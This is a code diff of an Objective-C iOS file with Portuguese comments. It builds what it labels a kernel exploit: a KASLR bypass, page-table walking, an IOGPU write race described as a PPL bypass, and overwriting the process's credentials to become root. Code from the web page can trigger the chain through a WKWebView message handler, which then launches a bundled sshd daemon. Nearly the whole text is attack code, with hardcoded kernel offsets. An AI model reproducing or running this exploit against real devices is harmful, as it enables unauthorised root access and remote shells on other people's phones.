@@ -3,7 +3,7 @@
 #import <spawn.h>
 #import <IOKit/IOKitLib.h>
 
-// Definições externas para APIs de baixo nível
+// APIs do Kernel (Externas)
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 
@@ -11,6 +11,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     uint64_t _kernel_slide;
 }
 
+// Lógica de leitura de memória física/kernel
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
     mach_vm_size_t size = sizeof(uint64_t);
@@ -18,6 +19,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
 }
 
+// Localiza o Kernel Slide (KASLR Bypass)
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
     for (uint64_t i = 0; i < 0x20000; i++) {
@@ -30,6 +32,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
+// Navega nas tabelas de páginas (PTE)
 - (uint64_t)get_pte_for_address:(uint64_t)vaddr {
     uint64_t slide = [self getKernelSlide];
     uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
@@ -39,6 +42,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
 }
 
+// Exploit de escrita via IOGPU (PPL Bypass)
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t pte_addr = [self get_pte_for_address:vaddr];
     io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
@@ -54,6 +58,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     IOServiceClose(connect);
 }
 
+// Localiza o ponteiro de credenciais do processo atual
 - (uint64_t)get_my_ucred_ptr {
     uint64_t slide = [self getKernelSlide];
     uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
@@ -66,24 +71,40 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
+// --- MÉTODO DE COMUNICAÇÃO COM O HTML ---
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
-                 replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
+                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
     
     NSString *action = message.body[@"action"];
-    if ([action isEqualToString:@"test_bridge"]) {
-        replyHandler(@{@"status": @"SUCCESS", @"info": @"Catalyst-26 Active"}, nil);
-    } else if ([action isEqualToString:@"pte_patch"]) {
+    
+    if ([action isEqualToString:@"pte_patch"]) {
+        // 1. Executa Escalada de Privilégio
         uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Become ROOT
+        if (ucred) {
+            [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0 (ROOT)
+        }
         
+        // 2. Tenta disparar o SSHD
         NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
         pid_t pid = 0;
         if (path) {
             char *const args[] = {(char*)[path UTF8String], "-D", NULL};
             posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
         }
-        replyHandler(@{@"status": @"OK", @"pid": @(pid), @"slide": [NSString stringWithFormat:@"0x%llx", _kernel_slide]}, nil);
+        
+        // 3. Retorna os dados para o 'await' no JavaScript
+        NSDictionary *response = @{
+            @"status": @"OK",
+            @"pid": @(pid),
+            @"slide": [NSString stringWithFormat:@"0x%llx", [self getKernelSlide]]
+        };
+        
+        replyHandler(response, nil);
+        
+    } else {
+        replyHandler(nil, @"Comando inválido");
     }
 }
+
 @end
